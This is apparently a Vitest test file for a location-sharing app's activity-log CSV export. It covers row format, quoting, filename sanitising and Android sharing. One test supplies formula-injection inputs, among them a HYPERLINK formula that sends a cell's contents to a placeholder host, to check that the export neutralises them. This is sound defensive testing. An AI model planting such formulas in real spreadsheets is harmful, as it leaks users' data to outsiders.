// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach } from 'vitest';

const native = vi.hoisted(() => ({ on: false, share: vi.fn() }));
vi.mock('@capacitor/core', () => ({
  Capacitor: { isNativePlatform: () => native.on },
  registerPlugin: () => ({ shareTextFile: native.share }),
}));
const clip = vi.hoisted(() => ({ copyText: vi.fn(() => Promise.resolve(true)) }));
vi.mock('../src/utils/clipboard.js', () => clip);

const { activityLogCsv, activityLogFileName, exportActivityLog, localTime } = await import('../src/utils/activityLogExport.js');

// Item 14 of the 2026-10 bug batch: the activity log as a CSV file someone can keep.
const at = new Date(2026, 9, 23, 21, 5, 9).getTime();

describe('the CSV', () => {
  it('has a header, one row per entry oldest first, in plain words and local time', () => {
    const csv = activityLogCsv([
      { at: at + 60000, kind: 'back-from-hidden', uid: 'u1', name: 'Bravo' },
      { at, kind: 'went-hidden', uid: 'u1', name: 'Bravo' },
      { at: at + 120000, kind: 'blocked', uid: 'u2', name: 'Charlie', byUid: 'u0', byName: 'Alpha' },
    ]);
    expect(csv.split('\r\n')).toEqual([
      'Time,Event,Name,User ID,By,By user ID',
      '2026-10-23 21:05:09,Hid their location,Bravo,u1,,',
      '2026-10-23 21:06:09,Showed their location again,Bravo,u1,,',
      '2026-10-23 21:07:09,Was removed and blocked,Charlie,u2,Alpha,u0',
      '',
    ]);
  });

  it('quotes a name with a comma or a quote in it, so it stays one cell', () => {
    const csv = activityLogCsv([{ at, kind: 'left-group', uid: 'u', name: 'Rao, "Ravi"' }]);
    expect(csv.split('\r\n')[1]).toBe('2026-10-23 21:05:09,Left the group,"Rao, ""Ravi""",u,,');
  });

  // A name is whatever a member typed. A spreadsheet reads a cell that starts with = + - @ (or a
  // tab or return) as a formula, quoted or not, so those get a leading apostrophe and stay text.
  it('keeps a name, id or admin name that starts like a formula as plain text', () => {
    const csv = activityLogCsv([
      { at, kind: 'left-group', uid: '+1+1', name: '=HYPERLINK("http://x.invalid/?"&D2,"x")', byName: '@SUM(1)', byUid: '-2' },
      { at: at + 1000, kind: 'left-group', uid: 'u', name: '\tTab', byName: '\rReturn' },
    ]);
    const lines = csv.split('\r\n');
    expect(lines[1]).toBe(`2026-10-23 21:05:09,Left the group,"'=HYPERLINK(""http://x.invalid/?""&D2,""x"")",'+1+1,'@SUM(1),'-2`);
    expect(lines[2].startsWith("2026-10-23 21:05:10,Left the group,'\tTab,u,")).toBe(true);
    expect(csv).toContain(`"'\rReturn"`);
  });

  it('leaves an ordinary name, and the time and event columns, exactly as they were', () => {
    const csv = activityLogCsv([{ at, kind: 'left-group', uid: 'u-1', name: 'Ravi K. (2nd yr)', byName: 'Alpha' }]);
    expect(csv.split('\r\n')[1]).toBe('2026-10-23 21:05:09,Left the group,Ravi K. (2nd yr),u-1,Alpha,');
  });

  it('is named for the group and the day, with nothing a path could hide in', () => {
    expect(activityLogFileName('AB-12/..', at)).toBe('locus-activity-AB12-2026-10-23.csv');
    expect(localTime(at)).toBe('2026-10-23 21:05:09');
  });
});

describe('handing it over on a phone', () => {
  beforeEach(() => {
    native.on = true;
    native.share.mockReset();
    clip.copyText.mockClear();
  });

  it("opens Android's share sheet with the file", async () => {
    native.share.mockResolvedValue(undefined);
    expect(await exportActivityLog([{ at, kind: 'kicked', uid: 'u', name: 'B' }], 'ABC123')).toBe('shared');
    expect(native.share).toHaveBeenCalledWith(expect.objectContaining({ name: 'locus-activity-ABC123-' + localTime(Date.now()).slice(0, 10) + '.csv', mimeType: 'text/csv' }));
    expect(native.share.mock.calls[0][0].text).toContain('Was removed');
  });

  it('copies it instead on an app too old to share a file', async () => {
    native.share.mockRejectedValue(Object.assign(new Error('not implemented'), { code: 'UNIMPLEMENTED' }));
    expect(await exportActivityLog([{ at, kind: 'kicked', uid: 'u', name: 'B' }], 'ABC123')).toBe('copied');
    expect(clip.copyText.mock.calls[0][0]).toContain('Time,Event');
  });
});
